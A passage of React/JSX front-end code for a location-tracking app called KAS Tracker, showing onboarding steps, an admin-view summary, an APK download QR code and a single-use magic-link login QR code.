            <div className="bg-gray-900 border border-gray-800 border-t-0 rounded-b-2xl px-4 pb-5 pt-4">

              {/* 3-column grid */}
              <div className="grid grid-cols-3 gap-3 mb-4">

                {/* Step 1 */}
                <div className="bg-gray-800/60 rounded-xl p-3 flex flex-col gap-2">
                  <div className="flex items-center gap-1.5">
                    <div className="w-5 h-5 rounded-full bg-orange-600 flex items-center justify-center text-white text-[10px] font-bold shrink-0">1</div>
                    <Download className="w-3.5 h-3.5 text-orange-400 shrink-0" />
                  </div>
                  <p className="text-white text-xs font-semibold leading-tight">Install the app</p>
                  <p className="text-gray-400 text-[11px] leading-relaxed">
                    Tap <strong className="text-gray-200">Download App</strong> and add KAS Tracker to your home screen so it stays active in the background.
                  </p>
                  <div className="bg-gray-900 rounded-lg px-2 py-1.5">
                    <p className="text-yellow-400 text-[10px] font-semibold mb-0.5">⚠️ iPhone</p>
                    <p className="text-gray-400 text-[10px]">Open in <strong className="text-gray-200">Safari</strong> → Share (□↑) → <strong className="text-gray-200">"Add to Home Screen"</strong></p>
                  </div>
                  <div className="bg-gray-900 rounded-lg px-2 py-1.5">
                    <p className="text-green-400 text-[10px] font-semibold mb-0.5">✓ Android</p>
                    <p className="text-gray-400 text-[10px]">Chrome menu → <strong className="text-gray-200">"Add to Home Screen"</strong></p>
                  </div>
                </div>

                {/* Step 2 */}
                <div className="bg-gray-800/60 rounded-xl p-3 flex flex-col gap-2">
                  <div className="flex items-center gap-1.5">
                    <div className="w-5 h-5 rounded-full bg-orange-600 flex items-center justify-center text-white text-[10px] font-bold shrink-0">2</div>
                    <MapPin className="w-3.5 h-3.5 text-orange-400 shrink-0" />
                  </div>
                  <p className="text-white text-xs font-semibold leading-tight">Grant permissions</p>
                  <p className="text-gray-400 text-[11px] leading-relaxed">Allow all when prompted:</p>
                  <ul className="flex flex-col gap-1.5">
                    <li className="flex items-start gap-1.5">
                      <MapPin className="w-3 h-3 text-green-400 mt-0.5 shrink-0" />
                      <span className="text-gray-300 text-[11px]"><strong>Location</strong> — GPS sent every 10s to the live map.</span>
                    </li>

                  </ul>
                </div>

                {/* Step 3 + 4 + Admin combined */}
                <div className="bg-gray-800/60 rounded-xl p-3 flex flex-col gap-3">

                  <div className="flex flex-col gap-1.5">
                    <div className="flex items-center gap-1.5">
                      <div className="w-5 h-5 rounded-full bg-orange-600 flex items-center justify-center text-white text-[10px] font-bold shrink-0">3</div>
                      <Power className="w-3.5 h-3.5 text-orange-400 shrink-0" />
                      <p className="text-white text-xs font-semibold leading-tight">Press START</p>
                    </div>
                    <p className="text-gray-400 text-[11px] leading-relaxed">
                      Tracking begins immediately. <strong className="text-gray-200">Minimize</strong> the app — do not close it.
                    </p>
                  </div>

                  <div className="h-px bg-gray-700" />

                  <div className="flex flex-col gap-1.5">
                    <div className="flex items-center gap-1.5">
                      <div className="w-5 h-5 rounded-full bg-orange-600 flex items-center justify-center text-white text-[10px] font-bold shrink-0">4</div>
                      <Radio className="w-3.5 h-3.5 text-orange-400 shrink-0" />
                      <p className="text-white text-xs font-semibold leading-tight">Screen off — still tracking</p>
                    </div>
                    <p className="text-gray-400 text-[11px] leading-relaxed">
                      GPS uploads every 10s even with screen off.
                    </p>
                    <div className="bg-gray-900 rounded-lg px-2 py-1.5">
                      <p className="text-orange-400 text-[10px] font-semibold mb-0.5">⚠️ Don't force-close</p>
                      <p className="text-gray-400 text-[10px]">Swiping away stops tracking. Press <strong className="text-gray-200">STOP</strong> in-app to end.</p>
                    </div>
                  </div>

                  <div className="h-px bg-gray-700" />

                  <div className="flex flex-col gap-1">
                    <p className="text-white text-xs font-semibold">👁 Admin sees</p>
                    <ul className="flex flex-col gap-1">
                      <li className="text-gray-400 text-[10px] flex items-start gap-1"><MapPin className="w-2.5 h-2.5 text-green-400 mt-0.5 shrink-0" />Live map pin, updated every 10s</li>
                      <li className="text-gray-400 text-[10px] flex items-start gap-1"><Radio className="w-2.5 h-2.5 text-blue-400 mt-0.5 shrink-0" />Location trail history</li>
                    </ul>
                  </div>

                </div>
              </div>

            </div>
          )}
        </div>

        {/* APK Download QR Code card — collapsible */}
        <div className="w-full max-w-2xl">
          <button
            onClick={handleOpenApkQr}
            className="w-full flex items-center justify-between bg-emerald-950/60 border border-emerald-800 rounded-2xl px-4 py-3 text-left"
          >
            <div className="flex items-center gap-2">
              <Download className="w-4 h-4 text-emerald-400 shrink-0" />
              <span className="text-emerald-200 text-sm font-semibold">Download App — Scan to get APK</span>
            </div>
            {showApkQr
              ? <ChevronUp className="w-4 h-4 text-emerald-400" />
              : <ChevronDown className="w-4 h-4 text-emerald-400" />}
          </button>

          {showApkQr && (
            <div className="bg-gray-900 border border-emerald-800 border-t-0 rounded-b-2xl px-4 pb-6 pt-4 flex flex-col items-center gap-4">
              <p className="text-gray-400 text-xs text-center max-w-sm leading-relaxed">
                Share this QR code with members who want to install KAS Tracker as a native app. Scanning it will download the APK file to their phone.
              </p>

              {apkQrLoading && (
                <div className="flex flex-col items-center gap-3 py-6">
                  <div className="w-8 h-8 border-4 border-emerald-500 border-t-transparent rounded-full animate-spin" />
                  <p className="text-gray-500 text-xs">Generating APK download QR code…</p>
                </div>
              )}

              {!apkQrLoading && apkQrUrl && (
                <>
                  <div className="bg-white rounded-2xl p-4 shadow-lg">
                    <img src={apkQrUrl} alt="APK Download QR Code" style={{ width: '200px', height: '200px' }} />
                  </div>
                  <div className="flex flex-col items-center gap-2">
                    <p className="text-emerald-300 text-[11px] font-semibold">APK Download Link</p>
                    <div className="flex items-center gap-1.5">
                      <Smartphone className="w-3.5 h-3.5 text-green-400" />
                      <span className="text-gray-400 text-[11px]">Android: Camera or Google Lens to scan</span>
                    </div>
                    <button
                      onClick={handleOpenApkQr}
                      className="mt-1 text-[11px] text-emerald-400 underline underline-offset-2"
                    >
                      Regenerate QR code
                    </button>
                  </div>
                </>
              )}

              {!apkQrLoading && !apkQrUrl && (
                <p className="text-red-400 text-xs">Failed to generate APK QR code. Please try again.</p>
              )}
            </div>
          )}
        </div>

        {/* QR Code card — collapsible */}
        <div className="w-full max-w-2xl">
          <button
            onClick={handleOpenQr}
            className="w-full flex items-center justify-between bg-violet-950/60 border border-violet-800 rounded-2xl px-4 py-3 text-left"
          >
            <div className="flex items-center gap-2">
              <QrCode className="w-4 h-4 text-violet-400 shrink-0" />
              <span className="text-violet-200 text-sm font-semibold">Scan QR Code to auto-login</span>
            </div>
            {showQr
              ? <ChevronUp className="w-4 h-4 text-violet-400" />
              : <ChevronDown className="w-4 h-4 text-violet-400" />}
          </button>

          {showQr && (
            <div className="bg-gray-900 border border-violet-800 border-t-0 rounded-b-2xl px-4 pb-6 pt-4 flex flex-col items-center gap-4">
              <p className="text-gray-400 text-xs text-center max-w-sm leading-relaxed">
                This QR code is <strong className="text-violet-300">unique to your account</strong>. Scanning it will open KAS Tracker on your phone and automatically log you in — no password needed. It expires in <strong className="text-white">24 hours</strong> and can only be used once.
              </p>

              {magicUrlLoading && (
                <div className="flex flex-col items-center gap-3 py-6">
                  <div className="w-8 h-8 border-4 border-violet-500 border-t-transparent rounded-full animate-spin" />
                  <p className="text-gray-500 text-xs">Generating your unique QR code…</p>
                </div>
              )}

              {!magicUrlLoading && magicUrl && (
                <>
                  <div className="bg-white rounded-2xl p-4 shadow-lg">
                    <QRCodeSVG
                      value={magicUrl}
                      size={200}
                      bgColor="#ffffff"
                      fgColor="#0f172a"
                      level="H"
                      includeMargin={false}
                    />
                  </div>
                  <div className="flex flex-col items-center gap-2">
                    <p className="text-violet-300 text-[11px] font-semibold">Unique login link — expires in 24h, single use</p>
                    <div className="flex items-center gap-4">
                      <div className="flex items-center gap-1.5">
                        <Smartphone className="w-3.5 h-3.5 text-yellow-400" />
                        <span className="text-gray-400 text-[11px]">iPhone: Camera app or Safari</span>
                      </div>
                      <div className="flex items-center gap-1.5">
                        <Smartphone className="w-3.5 h-3.5 text-green-400" />
                        <span className="text-gray-400 text-[11px]">Android: Camera or Google Lens</span>
                      </div>
                    </div>
                    <button
                      onClick={handleOpenQr}
                      className="mt-1 text-[11px] text-violet-400 underline underline-offset-2"
                    >
                      Generate a new QR code
                    </button>
                  </div>
                </>
              )}

              {!magicUrlLoading && !magicUrl && (
                <p className="text-red-400 text-xs">Failed to generate QR code. Please try again.</p>
              )}
            </div>
          )}
        </div>

      </main>
    </div>
  );
}
